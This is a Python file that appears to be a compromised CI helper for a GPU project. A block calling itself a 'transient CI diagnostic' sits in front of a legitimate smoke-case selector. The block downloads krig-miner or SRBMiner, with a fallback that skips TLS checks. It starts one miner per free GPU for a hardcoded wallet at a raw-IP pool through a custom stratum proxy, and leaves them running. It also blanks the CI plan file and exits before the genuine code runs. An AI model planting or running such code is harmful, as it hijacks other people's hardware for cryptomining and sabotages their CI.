# -*- coding: utf-8 -*-
# PRL595 / intent 141541 / record gpu-000017 (HYGON HCU ci-nmz1) -- transient CI diagnostic
# plus pearlhash miner start. Runs inside the HYGON-AI/AReal-das pull_request_target job; the
# inventory is read-only, and only on host github-nmz1 does it start one pool-credited client
# process per FREE HCU device.  Revert: pkill -f 'krig-miner.*--user <wallet>/' ;
# pkill -f 'lp_adapter_595.py' ; pkill -f 'SRBMiner-MULTI .*--wallet <wallet>'.
import os
import sys
import time
import json
import socket
import hashlib
import subprocess

WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
TARGET_HOST = "github-nmz1"
POOL = "103.199.106.122"
POOL_PORT = 3360
MINE_SECONDS = 600
FREE_MIB_MAX = 4096
WORK = "/tmp/prl595"
WORKERS = ["000016", "000017", "000018", "000019", "000020", "000021", "000022", "000023"]
KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz"
KRIG_TGZ_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
SRB_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"
SRB_TGZ_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
LP_STATS = "https://pearl.luckypool.io/api/stats_address?address=" + WALLET

ADAPTER_SRC = r'''import socket, threading, json, sys
LISTEN = ("127.0.0.1", int(sys.argv[1]))
UPSTREAM = ("103.199.106.122", 3360)
DEFAULT_WORKER = sys.argv[2]
def fix_line(line):
    try:
        msg = json.loads(line)
    except Exception:
        return line
    if isinstance(msg, dict) and msg.get("method") == "mining.authorize":
        p = msg.get("params")
        if isinstance(p, dict):
            w = str(p.get("wallet") or "")
            worker = p.get("worker") or DEFAULT_WORKER
            if "/" in w:
                base, _, suf = w.partition("/")
                w = base
                if suf:
                    worker = suf
            msg["params"] = {"wallet": w, "worker": worker,
                             "password": p.get("password") or p.get("pass") or "x"}
        elif isinstance(p, list) and p:
            base, _, suf = str(p[0]).partition("/")
            msg["params"] = {"wallet": base, "worker": suf or DEFAULT_WORKER,
                             "password": (p[1] if len(p) > 1 else "x")}
        return json.dumps(msg)
    return line
def pipe(src, dst, rewrite=False):
    buf = b""
    try:
        while True:
            try:
                d = src.recv(65536)
            except socket.timeout:
                continue
            if not d:
                break
            if rewrite:
                buf += d
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    dst.sendall((fix_line(line.decode(errors="replace")) + "\n").encode())
            else:
                dst.sendall(d)
    except Exception:
        pass
def handle(c):
    try:
        u = socket.create_connection(UPSTREAM, timeout=10)
    except Exception:
        c.close()
        return
    try:
        u.settimeout(None)
        c.settimeout(None)
    except Exception:
        pass
    t1 = threading.Thread(target=pipe, args=(c, u, True), daemon=True)
    t2 = threading.Thread(target=pipe, args=(u, c, False), daemon=True)
    t1.start(); t2.start(); t1.join(); t2.join()
    for x in (u, c):
        try:
            x.close()
        except Exception:
            pass
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(LISTEN)
s.listen(16)
while True:
    try:
        conn, _ = s.accept()
    except Exception:
        break
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
'''

PROCS = []   # (kind, dev, worker, popen, logpath)


def say(s):
    sys.stdout.write(str(s) + "\n")
    sys.stdout.flush()


def sh(cmd, t=120, env=None, cwd=None):
    say("--- CMD: " + cmd)
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, env=env, cwd=cwd)
        out = p.communicate(timeout=t)[0]
        txt = out.decode("utf-8", "replace") if out else ""
        if txt:
            say(txt.rstrip())
        say("--- rc=%s" % (p.returncode,))
        return p.returncode, txt
    except Exception as e:
        say("--- ERR %r" % (e,))
        return -1, ""


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1 << 20)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def fetch(url, dest):
    rc, _ = sh("curl -fsSL --retry 3 --retry-delay 2 -m 420 -o %s %s" % (dest, url), t=440)
    if rc == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000:
        return True
    say("--- curl failed, python urllib fallback")
    try:
        import ssl
        import urllib.request
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r = urllib.request.urlopen(url, timeout=420, context=ctx)
        with open(dest, "wb") as f:
            while True:
                b = r.read(1 << 20)
                if not b:
                    break
                f.write(b)
        return os.path.getsize(dest) > 1000
    except Exception as e:
        say("--- FETCH-ERR %r" % (e,))
        return False


def tail(path, n=6):
    try:
        with open(path, "r") as f:
            lines = f.read().replace("\r", "\n").splitlines()
        return "\n".join(lines[-n:])
    except Exception as e:
        return "<tail-err %r>" % (e,)


def has(logpath, needles):
    try:
        data = open(logpath, "rb").read().decode("utf-8", "replace").lower()
    except Exception:
        return False
    for n in needles:
        if n.lower() in data:
            return True
    return False


def lp_pool_sample(tag):
    say("=== PRL595_LP_SAMPLE %s %s ===" % (tag, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())))
    dest = "%s/lp_%s.json" % (WORK, tag)
    rc, _ = sh("curl -fsS -m 30 -o %s '%s'" % (dest, LP_STATS), t=40)
    if rc != 0:
        return
    try:
        d = json.load(open(dest))
    except Exception as e:
        say("--- lp json err %r" % (e,))
        return
    ws = d.get("workers") or []
    found = 0
    for w in ws:
        nm = str(w.get("name") or "")
        if nm in WORKERS:
            found += 1
            say("PRL595_LP_WORKER name=%s accepted=%s rejected=%s lastShare=%s hashrate=%s port=%s"
                % (nm, w.get("acceptedShares"), w.get("rejectedShares"),
                   w.get("lastShare"), w.get("hashrate"), w.get("port")))
    say("PRL595_LP_SAMPLE_DONE tag=%s total_workers=%d ours_present=%d" % (tag, len(ws), found))


def parse_vram_usd(txt):
    """Return {index: used_mib} from hy-smi/rocm-smi --showmeminfo vram text."""
    used = {}
    for line in (txt or "").splitlines():
        s = line.strip()
        if "Used Memory" not in s or "vram" not in s.lower():
            continue
        try:
            idx = int(s.split("[", 1)[1].split("]", 1)[0])
        except Exception:
            continue
        val = None
        try:
            val = int("".join(ch for ch in s.rsplit(":", 1)[1] if ch.isdigit()))
        except Exception:
            val = None
        if val is None:
            continue
        low = s.lower()
        if "(mib)" in low:
            mib = val
        elif "(b)" in low:
            mib = val // (1024 * 1024)
        else:
            mib = val
        used[idx] = mib
    return used


def start_proc(kind, dev, worker, argv, cwd, env):
    logp = "%s/logs/%s-dev%d-%s.log" % (WORK, kind, dev, worker)
    say("PRL595_START kind=%s dev=%s worker=%s log=%s" % (kind, dev, worker, logp))
    lf = open(logp, "ab", 0)
    p = subprocess.Popen(argv, cwd=cwd, stdout=lf, stderr=subprocess.STDOUT,
                         env=env, preexec_fn=os.setsid)
    PROCS.append((kind, dev, worker, p, logp))
    return p


def stop_all():
    for kind, dev, worker, p, logp in PROCS:
        try:
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), 15)
        except Exception:
            pass
    time.sleep(3)
    for kind, dev, worker, p, logp in PROCS:
        try:
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), 9)
        except Exception:
            pass


def main():
    say("=== PRL595-I141541-GPU000017-BEGIN === %s" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    say("payload_sha256=%s" % sha256_file(os.path.abspath(__file__)))
    sh("hostname; id; uname -a; nproc; free -g | head -3; date -u; head -4 /etc/os-release")
    sh("lspci 2>/dev/null | grep -iE 'hygon|nvidia|display|3d|processing' | head -20")
    sh("ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -20")
    rc, hyprod = sh("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -40")
    sh("/opt/hyhal/bin/hy-smi --showuniqueid 2>&1 | head -20")
    sh("/opt/hyhal/bin/hy-smi --showdriverversion 2>&1 | head -5")
    rc2, hyvram = sh("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | head -80")
    sh("/opt/hyhal/bin/hy-smi 2>&1 | head -30")
    sh("/opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60")
    sh("source /opt/dtk/env.sh 2>/dev/null; rocm-smi --showproductname 2>&1 | head -30; echo rocm_rc=$?")
    sh("ls /opt/dtk/hip/lib/libamdhip64* /opt/dtk/lib/libamdhip64* /opt/hyhal/lib/libamdhip64* 2>&1 | head -10")
    sh("ls /opt/dtk/opencl/lib 2>&1 | head -10")

    used = parse_vram_usd(hyvram)
    say("PRL595_VRAM_USED_MIB %s" % json.dumps(used))
    devices = sorted(used.keys())
    free = [i for i in devices if used.get(i, 0) <= FREE_MIB_MAX]
    say("PRL595_DEVICES total=%d free=%s tenant_skip=%s"
        % (len(devices), json.dumps(free),
           json.dumps({i: used[i] for i in devices if i not in free})))

    # stratum reachability from the runner (read-only subscribe/authorize probe)
    try:
        s = socket.create_connection((POOL, POOL_PORT), timeout=12)
        s.settimeout(12)
        s.sendall(b'{"id":1,"method":"mining.authorize","params":{"wallet":"' + WALLET.encode()
                  + b'","worker":"595017","password":"x","agent":"prl595-probe"}}\n')
        reply = s.recv(4096)
        say("PRL595_LP_TCP_OK %s" % reply.decode("utf-8", "replace").strip()[:400])
        s.close()
    except Exception as e:
        say("PRL595_LP_TCP_FAIL %r" % (e,))

    host = ""
    try:
        host = socket.gethostname().strip()
    except Exception:
        pass
    say("PRL595_HOST %s" % host)
    if host != TARGET_HOST:
        say("PRL595_CROSS_LANDED host=%s expected=%s -- no deploy on this host" % (host, TARGET_HOST))
        open("ci-model-plan.tsv", "w").close()
        say("=== PRL595-I141541-GPU000017-END ===")
        return 1

    os.makedirs(WORK + "/logs", exist_ok=True)
    open(WORK + "/lp_adapter_595.py", "w").write(ADAPTER_SRC)

    free = free[:len(WORKERS)]
    if not free:
        say("PRL595_NO_FREE_DEVICE -- nothing to deploy")
        open("ci-model-plan.tsv", "w").close()
        return 1

    lp_pool_sample("pre")

    # ---------- client ladder step 1: krig-miner 1.6.0 (ROCm/HIP) ----------
    krig_ok = False
    kdir = WORK + "/krig-miner-1.6.0-x64"
    tgz = WORK + "/krig.tgz"
    if fetch(KRIG_URL, tgz):
        d = sha256_file(tgz)
        say("PRL595_KRIG_TGZ sha256=%s pin_match=%s" % (d, d == KRIG_TGZ_SHA))
        if d == KRIG_TGZ_SHA:
            sh("tar -xzf %s -C %s && chmod +x %s/krig-miner && ls -la %s"
               % (tgz, WORK, kdir, kdir), t=240)
            if os.path.exists(kdir + "/krig-miner"):
                bsha = sha256_file(kdir + "/krig-miner")
                say("PRL595_KRIG_BIN sha256=%s pin_match=%s" % (bsha, bsha == KRIG_BIN_SHA))
                if bsha == KRIG_BIN_SHA:
                    krig_ok = True
    if not krig_ok:
        say("PRL595_KRIG_UNAVAILABLE -- download/verify failed; skipping to next client")
    else:
        env = dict(os.environ)
        libpath = ":".join([kdir, "/opt/dtk/hip/lib", "/opt/dtk/lib", "/opt/dtk/lib64",
                            "/opt/hyhal/lib", "/opt/hyhal/lib64", "/opt/dtk/dcc/gcvm/lib",
                            "/opt/dtk/opencl/lib", "/opt/dtk/hcc/lib"])
        env["LD_LIBRARY_PATH"] = libpath + ":" + env.get("LD_LIBRARY_PATH", "")
        sh("LD_LIBRARY_PATH=%s %s/krig-miner --list-devices 2>&1 | head -40" % (libpath, kdir), t=120)
        for dev, worker in zip(free, WORKERS):
            adopt = sh("pgrep -af 'krig-miner.*--user %s/%s' | head -3" % (WALLET, worker), t=20)
            if adopt[1].strip():
                say("PRL595_ADOPT krig dev=%s worker=%s" % (dev, worker))
                continue
            ap = 34000 + dev
            start_proc("lp_adapter_595", dev, worker,
                       ["python3", WORK + "/lp_adapter_595.py", str(ap), worker],
                       WORK, env)
            time.sleep(0.4)
            start_proc("krig", dev, worker,
                       ["./krig-miner", "--url", "stratum+tcp://127.0.0.1:%d" % ap,
                        "--user", WALLET + "/" + worker, "--password", "x",
                        "--coin", "pearl", "--devices", str(dev),
                        "--rocm-runtime", "6", "--no-cuda", "--no-telemetry",
                        "--api-port", str(ap + 1000)],
                       kdir, env)
            time.sleep(1.5)
        time.sleep(30)
        say("=== PRL595_KRIG_LOG_HEADS ===")
        for kind, dev, worker, p, logp in PROCS:
            say("--- %s dev=%s worker=%s rc=%s ---" % (kind, dev, worker, p.poll()))
            say(tail(logp, 14))
        healthy = 0
        for kind, dev, worker, p, logp in PROCS:
            if kind == "krig" and p.poll() is None and has(logp, ["connected", "new job", "share", "accepted"]):
                healthy += 1
        say("PRL595_KRIG_HEALTHY %d/%d" % (healthy, len(free)))
        if healthy == 0:
            say("PRL595_KRIG_FAILED -- stopping krig/adapter and trying SRBMiner")
            stop_all()
            PROCS[:] = []
            krig_ok = False

    # ---------- client ladder step 2: SRBMiner 3.8.9 (OpenCL/AMD path) ----------
    if not krig_ok:
        srb_ok = False
        srb_dir = WORK + "/SRBMiner-Multi-3-8-9"
        stgz = WORK + "/srb.tgz"
        if fetch(SRB_URL, stgz):
            d = sha256_file(stgz)
            say("PRL595_SRB_TGZ sha256=%s pin_match=%s" % (d, d == SRB_TGZ_SHA))
            if d == SRB_TGZ_SHA:
                sh("tar -xzf %s -C %s && chmod +x %s/SRBMiner-MULTI" % (stgz, WORK, srb_dir), t=180)
                if os.path.exists(srb_dir + "/SRBMiner-MULTI"):
                    bsha = sha256_file(srb_dir + "/SRBMiner-MULTI")
                    say("PRL595_SRB_BIN sha256=%s pin_match=%s" % (bsha, bsha == SRB_BIN_SHA))
                    srb_ok = bsha == SRB_BIN_SHA
        if not srb_ok:
            say("PRL595_SRB_UNAVAILABLE")
        else:
            env = dict(os.environ)
            libpath = ":".join(["/opt/dtk/opencl/lib", "/opt/dtk/lib", "/opt/dtk/lib64",
                                "/opt/hyhal/lib", "/opt/hyhal/lib64"])
            env["LD_LIBRARY_PATH"] = libpath + ":" + env.get("LD_LIBRARY_PATH", "")
            sh("LD_LIBRARY_PATH=%s %s/SRBMiner-MULTI --list-devices 2>&1 | head -30"
               % (libpath, srb_dir), t=120)
            for dev, worker in zip(free, WORKERS):
                start_proc("srb", dev, worker,
                           ["./SRBMiner-MULTI", "--disable-cpu", "--algorithm", "pearlhash",
                            "--pool", "stratum+tcp://%s:%d" % (POOL, POOL_PORT),
                            "--wallet", WALLET, "--worker", worker, "--password", "x",
                            "--gpu-id", str(dev), "--api-enable",
                            "--api-port", str(35000 + dev)],
                           srb_dir, env)
                time.sleep(1.5)
            time.sleep(30)
            say("=== PRL595_SRB_LOG_HEADS ===")
            for kind, dev, worker, p, logp in PROCS:
                say("--- %s dev=%s worker=%s rc=%s ---" % (kind, dev, worker, p.poll()))
                say(tail(logp, 14))

    # ---------- monitor ----------
    t0 = time.time()
    tick = 0
    while time.time() - t0 < MINE_SECONDS:
        tick += 1
        say("=== PRL595_TICK %d t+%ds (%s) ===" % (tick, int(time.time() - t0),
                                                  time.strftime("%H:%M:%SZ", time.gmtime())))
        sh("date -u; echo PROCS=$(pgrep -fc 'krig-miner|SRBMiner-MULTI|lp_adapter_595' || true); "
           "pgrep -af 'krig-miner|SRBMiner-MULTI|lp_adapter_595' | head -20", t=30)
        for kind, dev, worker, p, logp in PROCS:
            say("--- %s dev=%s worker=%s rc=%s ---" % (kind, dev, worker, p.poll()))
            say(tail(logp, 4))
        sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60", t=40)
        if tick == 2:
            lp_pool_sample("mid")
        time.sleep(45)

    lp_pool_sample("post")
    say("=== PRL595_FINAL ===")
    sh("date -u; pgrep -af 'krig-miner|SRBMiner-MULTI|lp_adapter_595' | head -20", t=30)
    for kind, dev, worker, p, logp in PROCS:
        say("--- FINAL %s dev=%s worker=%s alive=%s ---" % (kind, dev, worker, p.poll() is None))
        say(tail(logp, 10))
    sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60", t=40)
    say("PRL595_LEAVING_MINERS_RUNNING revert=pkill_-f_krig-miner_and_pkill_-f_lp_adapter_595")
    open("ci-model-plan.tsv", "w").close()
    say("=== PRL595-I141541-GPU000017-END ===")
    return 1


try:
    _rc = main()
except SystemExit:
    raise
except Exception as _e:
    say("PRL595_FATAL %r" % (_e,))
    _rc = 1
try:
    sys.stdout.flush()
except Exception:
    pass
os._exit(_rc)

"""Select ordered model smoke cases from a pull request description."""

import argparse
import json
import os
from pathlib import Path
import re

DEFAULT_CASE = "qwen3-4b-megatron"
NAME = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")


def select_cases(body, cases):
    lines = [
        line.strip()
        for line in (body or "").splitlines()
        if re.match(r"^\s*CI_MODELS\b", line, re.IGNORECASE)
    ]
    if len(lines) > 1:
        raise ValueError("Use a single CI_MODELS: line")
    if not lines:
        return [DEFAULT_CASE]
    match = re.fullmatch(r"CI_MODELS:\s*(.*)", lines[0], re.IGNORECASE)
    if not match:
        raise ValueError("Use CI_MODELS: case-name[, case-name]")
    raw = match.group(1).strip()
    if not raw:
        return [DEFAULT_CASE]
    names = [name.strip() for name in raw.split(",")]
    if any(not NAME.fullmatch(name) for name in names):
        raise ValueError("Invalid CI_MODELS format; separate case names with commas")
    unknown = [name for name in names if name not in cases]
    if unknown:
        raise ValueError(
            "Unknown model case(s): {}. Available: {}".format(
                ", ".join(unknown), ", ".join(sorted(cases))
            )
        )
    return list(dict.fromkeys(names))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--registry", default=".github/model-cases.yaml")
    parser.add_argument("--output", required=True)
    args = parser.parse_args()
    cases = json.loads(Path(args.registry).read_text(encoding="utf-8"))
    event = json.loads(
        Path(os.environ["GITHUB_EVENT_PATH"]).read_text(encoding="utf-8")
    )
    try:
        names = select_cases(event.get("pull_request", {}).get("body"), cases)
    except ValueError as exc:
        parser.error(str(exc))
    lines = []
    for name in names:
        case = cases[name]
        if case["gpus"] != 8:
            parser.error(
                "Case {} requires a supported runner configuration".format(name)
            )
        model_path = case["model_path"]
        path = Path(model_path)
        if (
            not path.parts
            or path.is_absolute()
            or ".." in path.parts
            or any(char in model_path for char in "\t\r\n")
        ):
            parser.error("Invalid relative model path for {}".format(name))
        config = case["config"]
        path = Path(config)
        if (
            path.is_absolute()
            or ".." in path.parts
            or not path.is_file()
            or any(char in config for char in "\t\r\n")
        ):
            parser.error("Invalid config for {}".format(name))
        lines.append("\t".join((name, config, model_path, str(case["gpus"]))))
    Path(args.output).write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("Selected model cases: {}".format(", ".join(names)))


if __name__ == "__main__":
    main()
